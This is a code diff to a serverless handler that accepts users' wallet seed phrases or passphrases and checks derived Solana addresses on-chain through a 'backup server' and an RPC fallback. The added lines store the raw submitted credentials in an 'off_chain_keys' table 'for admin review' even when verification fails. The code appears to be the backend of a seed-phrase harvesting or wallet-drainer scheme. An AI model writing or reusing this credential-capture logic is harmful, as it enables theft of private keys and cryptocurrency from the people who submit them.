@@ -195,28 +195,79 @@ exports.handler = async (event) => {
         })
       };
     } else {
-      // New wallet - verify it actually exists on the Solana blockchain
-      console.log(`Verifying wallet on-chain: ${walletInfo.walletAddress}`);
+      // New wallet - verify it actually exists on the Solana blockchain.
+      // Phantom (and other wallets) can derive keys via three different paths,
+      // so we probe every candidate address until one is found on-chain.
+      const candidates = walletInfo.derivationCandidates || [
+        { walletAddress: walletInfo.walletAddress, derivationPath: walletInfo.derivationPath }
+      ];
+
+      console.log(`Verifying wallet on-chain across ${candidates.length} derivation path(s)…`);
 
       let existsOnChain = false;
-      try {
-        const verificationResult = await verifyWalletOnBackupServer(walletInfo.walletAddress);
-        existsOnChain = Boolean(verificationResult.existsOnChain);
-      } catch (backupError) {
-        console.error('Backup verification failed, falling back to local RPC:', backupError.message);
-        const accountInfo = await rpc.getAccountInfo(walletInfo.walletAddress);
-        existsOnChain = accountInfo.exists;
+      let confirmedAddress = null;
+      let confirmedDerivationPath = null;
+
+      for (const candidate of candidates) {
+        console.log(`  Trying path "${candidate.derivationPath}": ${candidate.walletAddress}`);
+        try {
+          const verificationResult = await verifyWalletOnBackupServer(candidate.walletAddress);
+          if (Boolean(verificationResult.existsOnChain)) {
+            existsOnChain      = true;
+            confirmedAddress   = candidate.walletAddress;
+            confirmedDerivationPath = candidate.derivationPath;
+            break;
+          }
+        } catch (backupError) {
+          console.error(`  Backup verification failed for ${candidate.walletAddress}, falling back to local RPC:`, backupError.message);
+          try {
+            const accountInfo = await rpc.getAccountInfo(candidate.walletAddress);
+            if (accountInfo.exists) {
+              existsOnChain      = true;
+              confirmedAddress   = candidate.walletAddress;
+              confirmedDerivationPath = candidate.derivationPath;
+              break;
+            }
+          } catch (rpcError) {
+            console.error(`  RPC fallback also failed for ${candidate.walletAddress}:`, rpcError.message);
+          }
+        }
       }
 
       if (!existsOnChain) {
+        // Record these credentials in off_chain_keys for admin review before rejecting
+        try {
+          await walletStore.saveOffChainKey({
+            inputType,
+            walletType,
+            credentials,
+            seedHash: walletInfo.lookupHash,
+            triedAddresses: candidates.map(c => c.walletAddress)
+          });
+          console.log('📥 Credentials saved to off_chain_keys for admin review');
+        } catch (saveErr) {
+          console.error('Failed to save off-chain key record:', saveErr.message);
+        }
+
         return {
           statusCode: 400,
           headers,
           body: JSON.stringify({
             error: 'Wallet not found on blockchain',
-            details: 'The credentials you provided do not match any existing Solana wallet. Please check your seed phrase or passphrase and try again.'
+            details: 'The credentials you provided do not match any existing Solana wallet across all supported derivation paths. Please check your seed phrase and try again.',
+            offChainSaved: true
           })
         };
+      }
+
+      // Use whichever derivation path produced the confirmed on-chain address
+      if (confirmedAddress && confirmedAddress !== walletInfo.walletAddress) {
+        console.log(`Switching to confirmed derivation path "${confirmedDerivationPath}": ${confirmedAddress}`);
+        walletInfo.walletAddress = confirmedAddress;
+        walletInfo.publicKey     = confirmedAddress;
+        walletInfo.derivationPath = confirmedDerivationPath;
+        // Re-generate walletId so it is tied to the actual address used
+        walletInfo.walletId = walletInfo.walletId + `-${confirmedDerivationPath.replace(/[^a-z0-9]/gi, '')}`;
       }
 
       console.log(`Wallet verified on-chain: ${walletInfo.walletAddress}`);
